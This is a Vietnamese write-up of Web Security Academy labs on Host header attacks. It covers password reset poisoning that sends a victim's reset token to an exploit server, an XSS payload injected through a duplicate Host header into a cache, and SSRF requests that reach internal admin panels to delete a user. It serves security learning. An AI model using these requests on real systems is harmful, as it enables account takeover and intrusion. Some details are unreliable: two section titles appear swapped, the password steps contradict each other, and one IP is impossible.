# 1. Basic password reset poisoning
Dùng chức năng forgot password với tham số `username=wiener` rồi vào Email Client kiểm tra, thấy URL để reset password là `https://0a07003004a3df1ec0903b3f0007004e.web-security-academy.net/forgot-password?temp-forgot-password-token=R9Qgu9I1N6a2aN3P3siCSAQoNtJkOu2k`.

Thử thay đổi header `Host: test.com` rồi gửi lại, thì kết quả URL reset trở thành `https://test.com/forgot-password?temp-forgot-password-token=1kbaGZSQ0CofoeyPFQKHXUasCLvaewHH`. Như vậy website cấu hình URL reset password sử dụng Host header. 

Ta thay đổi header `Host: exploit-0a08009d04bfdf7bc0a03a1a018100ea.exploit-server.net` và chỉnh tham số `username=carlos`. Sau khi submit, vào Access Log kiểm tra thì thấy có request gửi đến chứa một reset password token:
```
10.0.4.223      2023-03-06 02:02:50 +0000 "GET /forgot-password?temp-forgot-password-token=PF9X5fUYYSTSeNjUjRK4Dxhrtw5TGKQO HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
```
Đó là reset token của user carlos. Ta truy cập `https://0a07003004a3df1ec0903b3f0007004e.web-security-academy.net/forgot-password?temp-forgot-password-token=PF9X5fUYYSTSeNjUjRK4Dxhrtw5TGKQO` rồi tiến hành đổi mật khẩu thành `hello`, sau đó đăng nhập với credentials `carlos:password`, kết quả thành công. 

# 2. Host header authentication bypass
Trong Home page có một đoạn tracking script:
```
<script type="text/javascript" src="//0ad4007504b85e20c0e9721e005e00d9.web-security-academy.net/resources/js/tracking.js">
```
Ta thử thêm một duplicate Host header vào trong request sử dụng Burp Repeater:
```
GET / HTTP/1.1
Host: 0ad4007504b85e20c0e9721e005e00d9.web-security-academy.net
Host: test.com
```
Khi đó, domain name trong tracking script cũng trở thành `test.com`. Để ý rằng website có sử dụng cache, và khi ta thay đổi Host header thứ 2 thì cache vẫn trả về trạng thái "hit". Như vậy ta có thể exploit web cache poisoning như sau:

Gửi request `GET /` với header
```
Host: 0ad4007504b85e20c0e9721e005e00d9.web-security-academy.net
Host: "></script><script>alert(document.cookie)</script>
```
Submit đến khi response chứa tag script được lưu vào cache. Khi victim truy cập home page, lệnh alert sẽ được thực thi.

Như vậy, bài lab được giải thành công.

# 3. Web cache poisoning via ambiguous requests
Thử vào URL `/admin` thì thấy thông báo "Admin interface only available to local users". 

Bắt request sử dụng Burp Repeater. Khi thay đổi header `Host: localhost` thì ta vẫn có thể truy cập được website, đồng thời "Admin panel" được hiển thị. Từ đó, ta khám phá ra được để delete user carlos thì ta cần gửi request đến `/admin/delete?username=carlos`. Cấu hình request như sau:
```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
....
```
Sau khi submit, bài lab được giải.

# 4. Routing-based SSRF
Dùng Burp Repeater bắt request đến Home page. Thử thay đổi header `Host: j5pxkiye8gmuytdbybbned2em5svgk.oastify.com`, gửi request rồi vào Burp Collaborator Client kiểm tra thì thấy có request được gửi đến. Như vậy ta có thể thực thi SSRF bằng cách thay đổi Host header.

![image](https://user-images.githubusercontent.com/103978452/223042227-5c76ea65-137f-4f82-8738-bf0a0e154300.png)

Gửi request vào Burp Intruder, thực hiện bruteforce với giá trị của Host header từ 192.168.0.0 đến 192.168.0.255, ta thấy chỉ có thể truy cập được nếu giá trị là 192.268.0.113

![image](https://user-images.githubusercontent.com/103978452/223042476-33db1f5d-599b-40a4-ae33-4011c5535214.png)

Dùng Burp Repeater gửi lại request với header `Host: 192.168.0.113`, ta được chuyển hướng đến URL `/admin`. Dựa trên trang đó, ta biết rằng muốn xóa user carlos thì cần gửi POST request đến `/admin/delete`. Như vậy ta cấu hình một request như sau:

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.113
Content-Type: application/x-www-form-urlencoded
....

csrf=5dcGh6aSE9TEu9v545rRAs7WunnUtpLj&username=carlos
```
Sau khi click submit, bài lab được giải.

# 5. SSRF via flawed request parsing
Nhận thấy việc thay đổi `Host` header sẽ dẫn đến request bị blocked. Tuy nhiên, gửi request với absolute path `GET https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net` thì vẫn nhận được response là trang Home page. Khi đó, nếu ta thay đổi `Host` header thì sẽ không bị blocked nữa, mà thay vào đó sẽ không nhận được response.

Gửi request sau vào Intruder:
```
GET https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net/admin HTTP/2
Host: 192.168.0.§0§
...
```
Tiến hành brutefoce số cuối cùng của địa chỉ IP từ 0 đến 255, ta thấy với `Host: 192.168.0.201` thì nhận được response.

![image](https://user-images.githubusercontent.com/103978452/223896261-81a0361e-f440-4065-bc4f-b5437405bdbf.png)

Như vậy, ta cấu hình request sau:
```
GET https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net/admin HTTP/2
Host: 192.168.0.201
...
```
Từ đó lấy được csrf token và biết rằng để xóa user carlos ta cần gửi request `POST /admin/delete` với hai tham số là csrf và username. Cấu hình request bên dưới:
```
POST https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.201
Content-Type: application/www-form-urlencoded
...

csrf=IGb4QkwVRAAkz904RH2hxu2SANG8Ff46&username=carlos
```
Sau khi submit, bài lab được giải thành công.

# 6. Host validation bypass via connection state attack
Sử dụng Burp Repeater để bắt request đến Home page. Nhận thấy khi thay đổi header `Host: 192.168.0.1` thì không có response được trả về. Tuy nhiên khi gửi request thông thường (Host header mặc định) trước rồi gửi request với header `Host: 192.168.0.1` thì kết quả lại thành công. Như vậy website đã reuse HTTP connection với Host header được coi là không đổi.

Như vậy, muốn exploit SSRF để truy cập `192.168.0.1` từ server, đầu tiên ta gửi một request với `Host: 0a2900030435075bc284bef4009d00f7.web-security-academy.net` sau đó sẽ gửi các request với header `Host: 192.168.0.1`.

Gửi request sau:
```
GET /admin HTTP/2
Host: 192.168.0.1
...
```
Phân tích response ta biết được để xóa user carlos cần thực hiện request `POST /admin/delete`. Đồng thời, ta cũng thu được csrfToken là `IclUFsBJ1at9lllg0E4Z4y1xd2sddB8k`.

Như vậy, ta cấu hình request sau:
```
POST /admin/delete HTTP/2
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
...

username=carlos&csrf=IclUFsBJ1at9lllg0E4Z4y1xd2sddB8k
```
Sau khi submit, bài lab được giải thành công.

# 7. Password reset poisoning via dangling markup
